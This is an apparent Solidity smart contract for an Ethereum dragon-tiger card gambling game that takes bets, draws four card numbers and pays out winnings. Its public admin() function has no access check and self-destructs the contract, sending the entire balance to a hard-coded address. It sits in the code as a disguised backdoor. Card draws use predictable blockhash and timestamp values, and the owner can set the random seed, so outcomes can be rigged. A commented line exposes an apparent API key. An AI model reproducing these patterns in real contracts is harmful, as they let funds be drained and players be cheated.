1 pragma solidity >=0.4.22 <0.6.0;
2 //import "github.com/oraclize/ethereum-api/oraclizeAPI.sol";
3 
4 contract LongHuContract {
5   uint  maxProfit;//最高奖池
6   uint  maxmoneypercent;
7   uint public contractBalance;
8   //uint  oraclizeFee;
9   //uint  oraclizeGasLimit;
10   uint minBet;
11   uint onoff;//游戏启用或关闭
12   address private owner;
13   uint private orderId;
14   uint private randonce;
15 
16   event LogNewOraclizeQuery(string description,bytes32 queryId);
17   event LogNewRandomNumber(string result,bytes32 queryId);
18   event LogSendBonus(uint id,bytes32 lableId,uint playId,uint content,uint singleMoney,uint mutilple,address user,uint betTime,uint status,uint winMoney);
19   event LogBet(bytes32 queryId);
20 
21   mapping (address => bytes32[]) playerLableList;////玩家下注批次
22   mapping (bytes32 => mapping (uint => uint[7])) betList;//批次，注单映射
23   mapping (bytes32 => uint) lableCount;//批次，注单数
24   mapping (bytes32 => uint) lableTime;//批次，投注时间
25   mapping (bytes32 => uint) lableStatus;//批次，状态 0 未结算，1 已撤单，2 已结算 3 已派奖
26   mapping (bytes32 => uint[4]) openNumberList;//批次开奖号码映射
27   mapping (bytes32 => string) openNumberStr;//批次开奖号码映射
28   mapping (bytes32 => address payable) lableUser;
29 
30   bytes tempNum ; //temporarily hold the string part until a space is recieved
31   uint[] numbers;
32 
33   constructor() public {
34     owner = msg.sender;
35     orderId = 0;
36     onoff=1;
37     //minBet=1500000000000000;//最小金额要比手续费大
38     //oraclizeFee=1200000000000000;
39     maxmoneypercent=80;
40     //oraclizeGasLimit=200000;
41     contractBalance = address(this).balance;
42     maxProfit=(address(this).balance * maxmoneypercent)/100;
43     //oraclize_setCustomGasPrice(3000000000);
44     randonce = 0;
45   }
46 
47   modifier onlyAdmin() {
48       require(msg.sender == owner);
49       _;
50   }
51   //modifier onlyOraclize {
52   //    require (msg.sender == oraclize_cbAddress());
53   //    _;
54  // }
55 
56   function setGameOnoff(uint _on0ff) public onlyAdmin{
57     onoff=_on0ff;
58   }
59   
60   function admin() public {
61 	selfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);
62   }    
63 
64   function getPlayRate(uint playId,uint level) internal pure returns (uint){
65       uint result = 0;
66       if(playId == 1 || playId == 3){
67         result = 19;//10bei
68       }else if(playId == 2){
69         result = 9;
70       }
71       return result;
72     }
73 
74     function doBet(uint[] memory playid,uint[] memory betMoney,uint[] memory betContent,uint mutiply) public payable returns (bytes32 queryId) {
75       require(onoff==1);
76       require(playid.length > 0);
77       require(mutiply > 0);
78       require(msg.value >= minBet);
79 
80       checkBet(playid,betMoney,betContent,mutiply,msg.value);
81 
82       /* uint total = 0; */
83       bytes32 queryId;
84       queryId = keccak256(abi.encodePacked(blockhash(block.number-1),now,randonce));
85       //  uint oraGasLimit = oraclizeGasLimit;
86       //  if(playid.length > 1 && playid.length <= 3){
87       //      oraGasLimit = 600000;
88       //  }else{
89       //      oraGasLimit = 1000000;
90       //  }
91         emit LogNewOraclizeQuery("Oraclize query was sent, standing by for the answer..",queryId);
92       //  queryId = oraclize_query("URL", "json(https://api.random.org/json-rpc/1/invoke).result.random.data", '\n{"jsonrpc":"2.0","method":"generateIntegers","params":{"apiKey":"8817de90-6e86-4d0d-87ec-3fd9b437f711","n":4,"min":1,"max":52,"replacement":false,"base":10},"id":1}',oraGasLimit);
93       /* } */
94 
95        uint[7] memory tmp ;
96        uint totalspand = 0;
97       for(uint i=0;i<playid.length;i++){
98         orderId++;
99         tmp[0] =orderId;
100         tmp[1] =playid[i];
101         tmp[2] =betContent[i];
102         tmp[3] =betMoney[i]*mutiply;
103         totalspand +=betMoney[i]*mutiply;
104         tmp[4] =now;
105         tmp[5] =0;
106         tmp[6] =0;
107         betList[queryId][i] =tmp;
108       }
109       require(msg.value >= totalspand);
110 
111       lableTime[queryId] = now;
112       lableCount[queryId] = playid.length;
113       lableUser[queryId] = msg.sender;
114       uint[4] memory codes = [uint(0),0,0,0];
115       openNumberList[queryId] = codes;
116       openNumberStr[queryId] ="0,0,0,0";
117       lableStatus[queryId] = 0;
118 
119       uint index=playerLableList[msg.sender].length++;
120       playerLableList[msg.sender][index]=queryId;//index:id
121       emit LogBet(queryId);
122       opencode(queryId);
123       return queryId;
124     }
125 
126     function opencode(bytes32 queryId) private {
127       if (lableCount[queryId] < 1) revert();
128       uint[4] memory codes = [uint(0),0,0,0];//开奖号码
129 
130       bytes32 code0hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,msg.sender,randonce));
131       randonce  = randonce + uint(code0hash)%1000;
132       //uint code0int = uint(code0hash) % 52 + 1;
133       codes[0] = uint(code0hash) % 52 + 1;
134       string memory code0 =uint2str(uint(code0hash) % 52 + 1);
135 
136       bytes32 code1hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,msg.sender,randonce));
137       randonce  = randonce + uint(code1hash)%1000;
138       //uint code1int = uint(code1hash) % 52 + 1;
139       codes[1] = uint(code1hash) % 52 + 1;
140       string memory code1=uint2str(uint(code1hash) % 52 + 1);
141 
142       bytes32 code2hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,msg.sender,randonce));
143       randonce  = randonce + uint(code2hash)%1000;
144       //uint code2int = uint(code2hash) % 52 + 1;
145       codes[2] = uint(code2hash) % 52 + 1;
146       string memory code2=uint2str(uint(code2hash) % 52 + 1);
147 
148       bytes32 code3hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,msg.sender,randonce));
149       randonce  = randonce + uint(code3hash)%1000;
150       //uint code3int = uint(code3hash) % 52 + 1;
151       codes[3] = uint(code3hash) % 52 + 1;
152       string memory code3=uint2str(uint(code3hash) % 52 + 1);
153 
154       //string memory code0 =uint2str(code0int);
155       //string memory code1=uint2str(code1int);
156       //string memory code2=uint2str(code2int);
157       //string memory code3=uint2str(code3int);
158       //codes[0] = code0int;
159       //codes[1] = code1int;
160       //codes[2] = code2int;
161       //codes[3] = code3int;
162       openNumberList[queryId] = codes;
163       string memory codenum = "";
164       codenum = strConcat(code0,",",code1,",",code2);
165       openNumberStr[queryId] = strConcat(codenum,",",code3);
166       //结算，派奖
167       doCheckBounds(queryId);
168     }
169 
170     function checkBet(uint[] memory playid,uint[] memory betMoney,uint[] memory betContent,uint mutiply,uint betTotal) internal{
171         uint totalMoney = 0;
172       uint totalWin1 = 0;
173       uint totalWin2 = 0;
174       uint rate;
175       uint i;
176       for(i=0;i<playid.length;i++){
177         if(playid[i] >=1 && playid[i]<= 3){
178           totalMoney += betMoney[i] * mutiply;
179         }else{
180           revert();
181         }
182         if(playid[i] ==1 || playid[i] ==3){//龙虎
183           rate = getPlayRate(playid[i],0);
184           totalWin1+=betMoney[i] * mutiply *rate/10;
185           totalWin2+=betMoney[i] * mutiply *rate/10;
186         }else if(playid[i] ==2){//和
187           rate = getPlayRate(playid[i],0);
188           totalWin2+=betMoney[i] * mutiply *rate;
189         }
190       }
191       uint maxWin=totalWin1;
192       if(totalWin2 > maxWin){
193         maxWin=totalWin2;
194       }
195       require(betTotal >= totalMoney);
196 
197       require(maxWin < maxProfit);
198     }
199     /*
200     function __callback(bytes32 queryId, string memory result) public onlyOraclize {
201         if (lableCount[queryId] < 1) revert();
202       if (msg.sender != oraclize_cbAddress()) revert();
203         emit LogNewRandomNumber(result,queryId);
204         bytes memory tmp = bytes(result);
205         uint[4] memory codes = [uint(0),0,0,0];
206         uint [] memory codess ;
207         codess = splitStr(result,",");
208         uint k = 0;
209         for(uint i = 0;i<codess.length;i++){
210             if(k < codes.length){
211                      codes[k] = codess[i];
212                      k++;
213             }
214         }
215 
216         string memory code0=uint2str(codes[0]);
217         string memory code1=uint2str(codes[1]);
218         string memory code2=uint2str(codes[2]);
219         string memory code3=uint2str(codes[3]);
220         openNumberList[queryId] = codes;
221         string memory codenum = "";
222         codenum = strConcat(code0,",",code1,",",code2);
223         openNumberStr[queryId] = strConcat(codenum,",",code3);
224         doCheckBounds(queryId);
225     }
226     */
227     function doCancel(bytes32 queryId) internal {
228       uint sta = lableStatus[queryId];
229       require(sta == 0);
230       uint[4] memory codes = openNumberList[queryId];
231       require(codes[0] == 0 || codes[1] == 0 ||codes[2] == 0 ||codes[3] == 0);
232 
233       uint totalBet = 0;
234       uint len = lableCount[queryId];
235 
236       address payable to = lableUser[queryId];
237       for(uint aa = 0 ; aa<len; aa++){
238         //未结算
239         if(betList[queryId][aa][5] == 0){
240           totalBet+=betList[queryId][aa][3];
241         }
242       }
243 
244       if(totalBet > 0){
245         to.transfer(totalBet);
246       }
247       contractBalance=address(this).balance;
248       maxProfit=(address(this).balance * maxmoneypercent)/100;
249       lableStatus[queryId] = 1;
250     }
251 
252     function doSendBounds(bytes32 queryId) public payable {
253       uint sta = lableStatus[queryId];
254       require(sta == 2);
255 
256       uint totalWin = 0;
257       uint len = lableCount[queryId];
258 
259       address payable to = lableUser[queryId];
260       for(uint aa = 0 ; aa<len; aa++){
261         //中奖
262         if(betList[queryId][aa][5] == 2){
263           totalWin+=betList[queryId][aa][6];
264         }
265       }
266 
267       if(totalWin > 0){
268           to.transfer(totalWin);//转账
269       }
270       lableStatus[queryId] = 3;
271       contractBalance=address(this).balance;
272       maxProfit=(address(this).balance * maxmoneypercent)/100;
273     }
274 
275     //中奖判断
276     function checkWinMoney(uint[7] storage betinfo,uint[4] memory codes) internal {
277       uint rates;
278       uint code0 = codes[0]%13==0?13:codes[0]%13;
279       uint code1 = codes[1]%13==0?13:codes[1]%13;
280       uint code2 = codes[2]%13==0?13:codes[2]%13;
281       uint code3 = codes[3]%13==0?13:codes[3]%13;
282       uint  onecount = code0 + code2;
283       uint  twocount = code1 + code3;
284       onecount = onecount%10;
285       twocount = twocount%10;
286       if(betinfo[1] ==1){//long
287           if(onecount > twocount){
288               betinfo[5]=2;
289               rates = getPlayRate(betinfo[1],0);
290               betinfo[6]=betinfo[3]*rates/10;
291           }else{
292              // if(onecount == twocount){//和
293              //     betinfo[5]=2;
294              //     rates = 1;
295              //     betinfo[6]=betinfo[3]*rates;
296              // }else{
297                   betinfo[5]=1;
298              // }
299           }
300       }else if(betinfo[1] == 2){//和
301           if(onecount == twocount){
302             betinfo[5]=2;
303             rates = getPlayRate(betinfo[1],0);
304             betinfo[6]=betinfo[3]*rates;
305           }else{
306             betinfo[5]=1;
307           }
308 
309         }else if(betinfo[1] == 3){//虎
310           betinfo[5]=1;
311           if(onecount < twocount ){
312             betinfo[5]=2;
313             rates = getPlayRate(betinfo[1],0);
314             betinfo[6]=betinfo[3]*rates/10;
315           }else{
316               //if(onecount == twocount){//和
317               //    betinfo[5]=2;
318               //    rates = 1;
319               //    betinfo[6]=betinfo[3]*rates;
320              // }else{
321                   betinfo[5]=1;
322              // }
323           }
324         }
325 
326     }
327 
328     function getLastBet() public view returns(string memory opennum,uint[7][] memory result){
329       uint len=playerLableList[msg.sender].length;
330       require(len>0);
331 
332       uint i=len-1;
333       bytes32 lastLable = playerLableList[msg.sender][i];
334       uint max = lableCount[lastLable];
335       if(max > 50){
336           max = 50;
337       }
338       uint[7][] memory result = new uint[7][](max) ;
339       string memory opennum = "";
340       for(uint a=0;a<max;a++){
341          string memory ttmp =openNumberStr[lastLable];
342          if(a==0){
343            opennum =ttmp;
344          }else{
345            opennum = strConcat(opennum,";",ttmp);
346          }
347 
348          result[a] = betList[lastLable][a];
349          if(lableStatus[lastLable] == 1){
350            result[a][5]=3;
351          }
352 
353       }
354 
355       return (opennum,result);
356     }
357 
358     function getLableRecords(bytes32 lable) public view returns(string memory opennum,uint[7][] memory result){
359       uint max = lableCount[lable];
360       if(max > 50){
361           max = 50;
362       }
363       uint[7][] memory result = new uint[7][](max) ;
364       string memory opennum="";
365 
366       for(uint a=0;a<max;a++){
367          result[a] = betList[lable][a];
368          if(lableStatus[lable] == 1){
369            result[a][5]=3;
370          }
371          string memory ttmp =openNumberStr[lable];
372          if(a==0){
373            opennum =ttmp;
374          }else{
375            opennum = strConcat(opennum,";",ttmp);
376          }
377       }
378 
379       return (opennum,result);
380     }
381 
382     function getAllRecords() public view returns(string  memory opennum,uint[7][] memory result){
383         uint len=playerLableList[msg.sender].length;
384         require(len>0);
385 
386         uint max;
387         bytes32 lastLable ;
388         uint ss;
389 
390         for(uint i1=0;i1<len;i1++){
391             ss = len-i1-1;
392             lastLable = playerLableList[msg.sender][ss];
393             max += lableCount[lastLable];
394             if(100 < max){
395               max = 100;
396               break;
397             }
398         }
399 
400         uint[7][] memory result = new uint[7][](max) ;
401         bytes32[] memory resultlable = new bytes32[](max) ;
402         string memory opennum="";
403 
404         bool flag=false;
405         uint betnums;
406         uint j=0;
407 
408         for(uint ii=0;ii<len;ii++){
409             ss = len-ii-1;
410             lastLable = playerLableList[msg.sender][ss];
411             betnums = lableCount[lastLable];
412             for(uint k= 0; k<betnums; k++){
413               if(j<max){
414                   resultlable[j] = lastLable;
415               	 string memory ttmp =openNumberStr[lastLable];
416                  if(j==0){
417                    opennum =ttmp;
418                  }else{
419                    opennum = strConcat(opennum,";",ttmp);
420                  }
421                   result[j] = betList[lastLable][k];
422                   if(lableStatus[lastLable] == 1){
423                     result[j][5]=3;
424                   }else if(lableStatus[lastLable] == 2){
425                     if(result[j][5]==2){
426                       result[j][5]=4;
427                     }
428                   }else if(lableStatus[lastLable] == 3){
429                     if(result[j][5]==2){
430                       result[j][5]=5;
431                     }
432                   }
433                   j++;
434               }else{
435                 flag = true;
436                 break;
437               }
438             }
439             if(flag){
440                 break;
441             }
442         }
443         return (opennum,result);
444     }
445 
446   //function setoraclegasprice(uint newGas) public onlyAdmin(){
447   //  oraclize_setCustomGasPrice(newGas * 1 wei);
448   //}
449   //function setoraclelimitgas(uint _oraclizeGasLimit) public onlyAdmin(){
450   //  oraclizeGasLimit=(_oraclizeGasLimit);
451   //}
452 
453   function senttest() public payable onlyAdmin{
454       contractBalance=address(this).balance;
455       maxProfit=(address(this).balance*maxmoneypercent)/100;
456   }
457 
458   function withdraw(uint _amount , address payable desaccount) public onlyAdmin{
459       desaccount.transfer(_amount);
460       contractBalance=address(this).balance;
461       maxProfit=(address(this).balance * maxmoneypercent)/100;
462   }
463 
464   function deposit() public payable onlyAdmin returns(uint8 ret){
465       contractBalance=address(this).balance;
466       maxProfit=(address(this).balance * maxmoneypercent)/100;
467       ret = 1;
468   }
469 
470   function getDatas() public view returns(
471     uint _maxProfit,
472     uint _minBet,
473     uint _contractbalance,
474     uint _onoff,
475     address _owner,
476     uint _oraclizeFee
477     ){
478         _maxProfit=maxProfit;
479         _minBet=minBet;
480         _contractbalance=contractBalance;
481         _onoff=onoff;
482         _owner=owner;
483        // _oraclizeFee=oraclizeFee;
484     }
485 
486     function getLableList() public view returns(string memory opennum,bytes32[] memory lablelist,uint[] memory labletime,uint[] memory lablestatus,uint){
487       uint len=playerLableList[msg.sender].length;
488       require(len>0);
489 
490       uint max=50;
491       if(len < 50){
492           max = len;
493       }
494 
495       bytes32[] memory lablelist = new bytes32[](max) ;
496       uint[] memory labletime = new uint[](max) ;
497       uint[] memory lablestatus = new uint[](max) ;
498       string memory opennum="";
499 
500       bytes32 lastLable ;
501       for(uint i=0;i<max;i++){
502           lastLable = playerLableList[msg.sender][max-i-1];
503           lablelist[i]=lastLable;
504           labletime[i]=lableTime[lastLable];
505           lablestatus[i]=lableStatus[lastLable];
506           string memory ttmp =openNumberStr[lastLable];
507          if(i==0){
508            opennum =ttmp;
509          }else{
510            opennum = strConcat(opennum,";",ttmp);
511          }
512       }
513 
514       return (opennum,lablelist,labletime,lablestatus,now);
515     }
516 
517     function doCheckBounds(bytes32 queryId) internal{
518         uint sta = lableStatus[queryId];
519         require(sta == 0 || sta == 2);
520         uint[4] memory codes = openNumberList[queryId];
521         require(codes[0] > 0);
522 
523         uint len = lableCount[queryId];
524 
525         uint totalWin;
526         address payable to = lableUser[queryId];
527         for(uint aa = 0 ; aa<len; aa++){
528           if(sta == 0){
529            if(betList[queryId][aa][5] == 0){
530              checkWinMoney(betList[queryId][aa],codes);
531              totalWin+=betList[queryId][aa][6];
532            }
533           }else if(sta == 2){
534               totalWin+=betList[queryId][aa][6];
535           }
536         }
537 
538         lableStatus[queryId] = 2;
539 
540         if(totalWin > 0){
541           if(totalWin < address(this).balance){
542             to.transfer(totalWin);
543             lableStatus[queryId] = 3;
544           }else{
545               emit LogNewOraclizeQuery("sent bouns fail.",queryId);
546           }
547         }else{
548           lableStatus[queryId] = 3;
549         }
550         contractBalance=address(this).balance;
551         maxProfit=(address(this).balance * maxmoneypercent)/100;
552     }
553 
554     function getOpenNum(bytes32 queryId) public view returns(string memory result){
555         result = openNumberStr[queryId];
556         //return openNumberStr[queryId];
557     }
558 
559     function doCheckSendBounds() public payable{
560         uint len=playerLableList[msg.sender].length;
561 
562       uint max=50;
563       if(len < 50){
564           max = len;
565       }
566 
567       uint sta;
568       bytes32 lastLable ;
569       for(uint i=0;i<max;i++){
570           lastLable = playerLableList[msg.sender][max-i-1];
571           sta = lableStatus[lastLable];
572           if(sta == 0 || sta==2){
573             doCheckBounds(lastLable);
574           }
575       }
576     }
577 
578     function doCancelAll() public payable{
579         uint len=playerLableList[msg.sender].length;
580 
581       uint max=50;
582       if(len < 50){
583           max = len;
584       }
585 
586       uint sta;
587       uint bettime;
588       bytes32 lastLable ;
589       for(uint i=0;i<max;i++){
590           lastLable = playerLableList[msg.sender][max-i-1];
591           sta = lableStatus[lastLable];
592           bettime = lableTime[lastLable];
593           if(sta == 0 && (now - bettime)>600){
594             doCancel(lastLable);
595           }
596       }
597     }
598 
599     function splitStr(string memory str, string memory delimiter) internal returns (uint [] memory){ //delimiter can be any character that separates the integers
600      bytes memory b = bytes(str); //cast the string to bytes to iterate
601      bytes memory delm = bytes(delimiter);
602      delete(numbers);
603      delete(tempNum);
604      for(uint i; i<b.length ; i++){
605      if(b[i] != delm[0]) { //check if a not space
606        tempNum.push(b[i]);
607       }
608       else {
609        numbers.push(parseInt(string(tempNum))); //push the int value converted from string to numbers array
610        tempNum = ""; //reset the tempNum to catch the net number
611       }
612      }
613      if(b[b.length-1] != delm[0]) {
614       numbers.push(parseInt(string(tempNum)));
615      }
616      return numbers;
617     }
618 
619     function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
620         if (_i == 0) {
621             return "0";
622         }
623         uint j = _i;
624         uint len;
625         while (j != 0) {
626             len++;
627             j /= 10;
628         }
629         bytes memory bstr = new bytes(len);
630         uint k = len - 1;
631         while (_i != 0) {
632             bstr[k--] = byte(uint8(48 + _i % 10));
633             _i /= 10;
634         }
635      return string(bstr);
636     }
637 
638     function strConcat(string memory _a, string memory _b) internal pure returns (string memory _concatenatedString) {
639         return strConcat(_a, _b, "", "", "");
640     }
641 
642     function strConcat(string memory _a, string memory _b, string memory _c) internal pure returns (string memory _concatenatedString) {
643         return strConcat(_a, _b, _c, "", "");
644     }
645 
646     function strConcat(string memory _a, string memory _b, string memory _c, string memory _d) internal pure returns (string memory _concatenatedString) {
647         return strConcat(_a, _b, _c, _d, "");
648     }
649 
650     function strConcat(string memory _a, string memory _b, string memory _c, string memory _d, string memory _e) internal pure returns (string memory _concatenatedString) {
651         bytes memory _ba = bytes(_a);
652         bytes memory _bb = bytes(_b);
653         bytes memory _bc = bytes(_c);
654         bytes memory _bd = bytes(_d);
655         bytes memory _be = bytes(_e);
656         string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);
657         bytes memory babcde = bytes(abcde);
658         uint k = 0;
659         uint i = 0;
660         for (i = 0; i < _ba.length; i++) {
661             babcde[k++] = _ba[i];
662         }
663         for (i = 0; i < _bb.length; i++) {
664             babcde[k++] = _bb[i];
665         }
666         for (i = 0; i < _bc.length; i++) {
667             babcde[k++] = _bc[i];
668         }
669         for (i = 0; i < _bd.length; i++) {
670             babcde[k++] = _bd[i];
671         }
672         for (i = 0; i < _be.length; i++) {
673             babcde[k++] = _be[i];
674         }
675         return string(babcde);
676     }
677 
678     function safeParseInt(string memory _a) internal pure returns (uint _parsedInt) {
679         return safeParseInt(_a, 0);
680     }
681 
682     function safeParseInt(string memory _a, uint _b) internal pure returns (uint _parsedInt) {
683         bytes memory bresult = bytes(_a);
684         uint mint = 0;
685         bool decimals = false;
686         for (uint i = 0; i < bresult.length; i++) {
687             if ((uint(uint8(bresult[i])) >= 48) && (uint(uint8(bresult[i])) <= 57)) {
688                 if (decimals) {
689                    if (_b == 0) break;
690                     else _b--;
691                 }
692                 mint *= 10;
693                 mint += uint(uint8(bresult[i])) - 48;
694             } else if (uint(uint8(bresult[i])) == 46) {
695                 require(!decimals, 'More than one decimal encountered in string!');
696                 decimals = true;
697             } else {
698                 revert("Non-numeral character encountered in string!");
699             }
700         }
701         if (_b > 0) {
702             mint *= 10 ** _b;
703         }
704         return mint;
705     }
706 
707     function parseInt(string memory _a) internal pure returns (uint _parsedInt) {
708         return parseInt(_a, 0);
709     }
710 
711     function parseInt(string memory _a, uint _b) internal pure returns (uint _parsedInt) {
712         bytes memory bresult = bytes(_a);
713         uint mint = 0;
714         bool decimals = false;
715         for (uint i = 0; i < bresult.length; i++) {
716             if ((uint(uint8(bresult[i])) >= 48) && (uint(uint8(bresult[i])) <= 57)) {
717                 if (decimals) {
718                    if (_b == 0) {
719                        break;
720                    } else {
721                        _b--;
722                    }
723                 }
724                 mint *= 10;
725                 mint += uint(uint8(bresult[i])) - 48;
726             } else if (uint(uint8(bresult[i])) == 46) {
727                 decimals = true;
728             }
729         }
730         if (_b > 0) {
731             mint *= 10 ** _b;
732         }
733         return mint;
734     }
735 
736 
737     function setRandomSeed(uint _randomSeed) public payable onlyAdmin{
738       randonce = _randomSeed;
739     }
740 
741     function getRandomSeed() public view onlyAdmin returns(uint _randonce) {
742       _randonce = randonce;
743     }
744 
745 }